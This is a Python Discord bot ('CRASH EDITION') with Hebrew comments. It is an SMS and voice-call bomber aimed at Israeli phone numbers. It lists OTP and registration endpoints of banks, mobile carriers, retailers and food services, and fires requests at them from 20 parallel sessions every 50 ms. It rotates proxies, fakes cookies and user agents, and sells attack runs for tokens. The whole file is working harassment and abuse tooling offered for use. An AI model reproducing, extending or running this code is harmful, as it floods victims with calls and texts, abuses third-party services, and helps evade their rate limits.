import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import secrets
import time
from collections import deque

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# ========== PROXY MANAGER ==========
class ProxyManager:
    def __init__(self):
        self.proxies = self._load_proxies()
        self.current_proxy = None
        self.last_change = time.time()
    
    def _load_proxies(self):
        """טעינת פרוקסים"""
        proxies = []
        # פרוקסים ישראליים
        for i in [100,102,104,106,108,110,112,114,116,118,120,122,124,126,128,130,132,134,136,138,
                 140,142,144,146,148,150,152,154,156,158,160,162,164,166,168,170,172,174,176,178,
                 180,182,184,186,188,190,192,194,196,198,200,202,204,206,208,210,212,214,216,218,
                 220,222,224,226,228,230,232,234,236,238,240,242,244,246,248,250]:
            proxies.append(f"http://185.162.230.{i}:80")
            proxies.append(f"http://185.162.231.{i}:80")
        return proxies
    
    async def get_proxy(self):
        """מחזיר פרוקסי - מחליף כל 10 שניות"""
        if time.time() - self.last_change > 10 or not self.current_proxy:
            self.current_proxy = random.choice(self.proxies)
            self.last_change = time.time()
        return self.current_proxy

# ========== COOKIE CLEANER ==========
class CookieCleaner:
    def __init__(self):
        self.cookies = {}
        self.last_clean = time.time()
    
    def get_headers(self, domain):
        """מחזיר headers עם קוקיז חדשים"""
        if time.time() - self.last_clean > 30:  # מנקה כל 30 שניות
            self.cookies = {}
            self.last_clean = time.time()
        
        if domain not in self.cookies:
            self.cookies[domain] = {
                f"session": secrets.token_hex(16),
                f"csrf": secrets.token_hex(8),
                "_ga": f"GA1.2.{random.randint(1000000,9999999)}.{int(time.time())}",
                "_gid": f"GA1.2.{random.randint(1000000,9999999)}.{int(time.time())}"
            }
        
        cookie_str = "; ".join([f"{k}={v}" for k, v in self.cookies[domain].items()])
        return {
            "Cookie": cookie_str,
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

# ========== BOT CLASS ==========
class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.proxy_manager = ProxyManager()
        self.cookie_cleaner = CookieCleaner()

bot = CyberBot()

# ========== USER AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Mobile Safari/604.1",
]

# ========== VOICE APIS ==========
VOICE_APIS = [
    {"name": "Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "data": {"phone": "PHONE", "sendVoice": True}},
    {"name": "Leumi", "url": "https://api.leumi.co.il/api/otp/send", "data": {"phone": "PHONE", "voice": True}},
    {"name": "Discount", "url": "https://api.discountbank.co.il/auth/otp", "data": {"phone": "PHONE_RAW", "method": "voice"}},
    {"name": "Mizrahi", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "data": {"phone": "PHONE", "type": "voice"}},
    {"name": "Cellcom", "url": "https://digital-api.cellcom.co.il/api/otp/VoiceCall", "data": {"phone": "PHONE"}},
    {"name": "Partner", "url": "https://www.partner.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "data": {"phone": "PHONE_RAW"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/voice", "data": {"phoneNumber": "PHONE_RAW"}},
]

# ========== MAGENTO APIS ==========
MAGENTO_APIS = [
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adika", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
]

# ========== SMS APIS ==========
SMS_APIS = [
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "data": {"phone": "PHONE"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "BurgerKing", "url": "https://www.burgerking.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "data": {"phone": "PHONE"}},
]

ALL_APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS

# ========== פונקציות שליחה מהירות ==========
async def send_magento(session, url, phone_raw, headers):
    """שליחת מג'נטו מהירה"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    })
    
    try:
        async with session.post(url, data=data, headers=headers, timeout=2) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api(session, api, phone, phone_raw, headers):
    """שליחת API מהירה"""
    try:
        headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Content-Type": "application/json"
        })
        
        if "data" in api:
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data = json.loads(data_str)
        else:
            data = {}
        
        async with session.post(api["url"], json=data, headers=headers, timeout=2) as resp:
            return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפת קריסה ==========
async def crash_attack(phone, duration_mins, attack_type, user_id, interaction, attack_id):
    """מתקפה מהירה במיוחד"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    
    # בחירת APIs
    if attack_type == "magento":
        apis = MAGENTO_APIS
    elif attack_type == "sms":
        apis = SMS_APIS
    elif attack_type == "voice":
        apis = VOICE_APIS
    else:
        apis = ALL_APIS
    
    await interaction.followup.send(
        f"💥 **CRASH ATTACK!**\n📱 {phone}\n⏱️ {duration_mins} דקות\n🎯 {len(apis)} APIs",
        ephemeral=True
    )
    
    # 20 סשנים
    sessions = [aiohttp.ClientSession() for _ in range(20)]
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            proxy = await bot.proxy_manager.get_proxy()
            tasks = []
            
            for session in sessions:
                domain = random.choice(["co.il", "com"])
                headers = bot.cookie_cleaner.get_headers(domain)
                
                for api in apis:
                    if api.get("type") == "magento":
                        tasks.append(send_magento(session, api["url"], phone_raw, headers.copy()))
                    else:
                        tasks.append(send_api(session, api, phone, phone_raw, headers.copy()))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_sent += sum(1 for r in results if r is True)
            
            # עדכון כל 5 שניות
            if total_sent % 50 == 0:
                seconds = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds())
                await interaction.followup.send(f"📊 {seconds}s: {total_sent}", ephemeral=True)
            
            await asyncio.sleep(0.05)  # 50ms
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    await interaction.followup.send(f"✅ **FINISHED!**\n📊 סה\"כ: {total_sent}", ephemeral=True)

# ========== פקודות ==========
@bot.tree.command(name="check", description="בדוק APIs")
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 בודק...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    working = []
    
    async with aiohttp.ClientSession() as session:
        for api in ALL_APIS[:20]:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            if api.get("type") == "magento":
                success = await send_magento(session, api["url"], test_raw, headers)
            else:
                success = await send_api(session, api, test_phone, test_raw, headers)
            
            if success:
                working.append(api["name"])
    
    await interaction.followup.send(f"✅ **{len(working)}** עובדים", ephemeral=True)

@bot.tree.command(name="stop", description="עצור הכל")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            stopped += 1
    await interaction.response.send_message(f"🛑 עצרתי {stopped}", ephemeral=True)

# ========== VIEW ==========
class AttackModal(ui.Modal, title="💥 CRASH"):
    phone = ui.TextInput(label="📱 טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ דקות", default="3")
    attack_type = ui.TextInput(label="🎯 סוג", default="all", placeholder="all/sms/voice/magento")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        attack_type = self.attack_type.value.strip().lower()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב 972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 30:
                await interaction.response.send_message("❌ 1-30 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 1000})
            user_doc = {"tokens": 1000}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין טוקנים", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        await interaction.response.send_message(
            f"💥 **ACTIVATED!**\n📱 {phone}\n💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        asyncio.create_task(crash_attack(phone, duration, attack_type, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="💥 CRASH", style=discord.ButtonStyle.danger)
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 CHECK", style=discord.ButtonStyle.secondary)
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_command(interaction)
    
    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await stop_command(interaction)

@bot.tree.command(name="setup", description="פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 10000})
        tokens = 10000
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="💥 CRASH EDITION",
        description=f"{len(ALL_APIS)} APIs | 20 סשנים | 50ms",
        color=0xff0000
    )
    embed.add_field(name="💎 טוקנים", value=f"**{tokens}**")
    embed.add_field(name="🎯 פעיל", value=active)
    
    await interaction.response.send_message(embed=embed, view=MainView())

if __name__ == "__main__":
    logging.info(f"💥 STARTING CRASH EDITION with {len(ALL_APIS)} APIs")
    bot.run(TOKEN)
